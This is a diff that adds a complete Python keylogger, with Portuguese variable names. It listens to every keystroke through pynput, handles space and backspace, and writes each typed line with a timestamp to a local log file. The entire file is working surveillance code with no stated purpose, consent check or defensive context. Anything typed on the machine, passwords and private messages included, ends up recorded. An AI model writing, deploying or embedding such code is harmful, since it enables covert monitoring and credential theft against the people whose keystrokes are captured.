@@ -1,0 +1,24 @@
+import datetime
+import io
+from pynput.keyboard import Listener, Key
+
+arquivo_log = "log.txt"
+texto_capturado = ""
+
+def capturar_tecla(tecla):
+    global texto_capturado
+    with io.open(arquivo_log, "a", encoding="utf-8") as log:
+        if tecla == Key.enter:
+            log.write("{} - {}\n".format(texto_capturado, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-4]))
+            texto_capturado = ""
+        elif tecla == Key.space:
+            texto_capturado += " "
+        elif tecla == Key.backspace:
+            texto_capturado = texto_capturado[:-1]
+        else:
+            texto_capturado += str(tecla).replace("'", "")
+
+listener_teclado = Listener(on_press=capturar_tecla)
+
+listener_teclado.start()
+listener_teclado.join()
